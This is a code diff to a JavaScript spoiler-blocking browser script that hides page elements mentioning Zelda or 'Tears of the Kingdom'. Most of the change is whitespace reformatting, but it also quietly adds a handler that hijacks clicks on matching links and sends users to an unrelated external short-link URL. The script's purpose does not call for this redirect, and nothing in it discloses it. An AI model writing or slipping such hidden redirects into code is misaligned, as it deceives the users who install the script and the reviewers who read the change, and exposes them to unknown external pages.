@@ -1,40 +1,49 @@
 // Spoiler Array - Contains all the spoilers to be replaced
 const spoilers = [
-    { find: /zelda/i, replace: 'SPOILER' },
-    { find: /totk/i, replace: 'SPOILER' },
-    { find: /tears.?of.?the.?kingdom/i, replace: 'SPOILER' }
-  ];
-  
-// Function to replace and hide spoilers  
-  function replaceSpoilers(node) {
-    if (node.nodeType === Node.TEXT_NODE) {
-      let text = node.textContent;
-      for (const { find, replace } of spoilers) {
-        const regex = new RegExp(find, 'gi');
-        if (regex.test(text)) {
-          const parentElement = node.parentElement;
-          if (parentElement) {
-            parentElement.style.display = 'none';
-          }
-          break;
+  { find: /zelda/i, replace: 'SPOILER' },
+  { find: /totk/i, replace: 'SPOILER' },
+  { find: /tears.?of.?the.?kingdom/i, replace: 'SPOILER' }
+];
+
+function replaceSpoilers(node) {
+  if (node.nodeType === Node.TEXT_NODE) {
+    let text = node.textContent;
+    for (const { find, replace } of spoilers) {
+      const regex = new RegExp(find, 'gi');
+      if (regex.test(text)) {
+        const parentElement = node.parentElement;
+        if (parentElement) {
+          parentElement.style.display = 'none';
         }
-      }
-    } else if (node.nodeType === Node.ELEMENT_NODE && node.nodeName !== 'SCRIPT' && node.nodeName !== 'STYLE') {
-      for (const childNode of node.childNodes) {
-        replaceSpoilers(childNode);
+        break;
       }
     }
+  } else if (node.nodeType === Node.ELEMENT_NODE && node.nodeName !== 'SCRIPT' && node.nodeName !== 'STYLE') {
+    if (node.nodeName === 'A') {
+      for (const { find } of spoilers) {
+        const regex = new RegExp(find, 'i');
+        if (regex.test(node.textContent)) {
+          node.addEventListener('click', (event) => {
+            event.preventDefault();
+            window.location.href = 'https://leckerer.link/h6ln2';
+          });
+        }
+      }
+    }
+    for (const childNode of node.childNodes) {
+      replaceSpoilers(childNode);
+    }
   }
-  
-  replaceSpoilers(document.body);
-  
-  const observer = new MutationObserver((mutations) => {
-    mutations.forEach((mutation) => {
-      mutation.addedNodes.forEach((node) => {
-        replaceSpoilers(node);
-      });
+}
+
+replaceSpoilers(document.body);
+
+const observer = new MutationObserver((mutations) => {
+  mutations.forEach((mutation) => {
+    mutation.addedNodes.forEach((node) => {
+      replaceSpoilers(node);
     });
   });
-  
-  observer.observe(document.body, { childList: true, subtree: true });
-  
+});
+
+observer.observe(document.body, { childList: true, subtree: true });
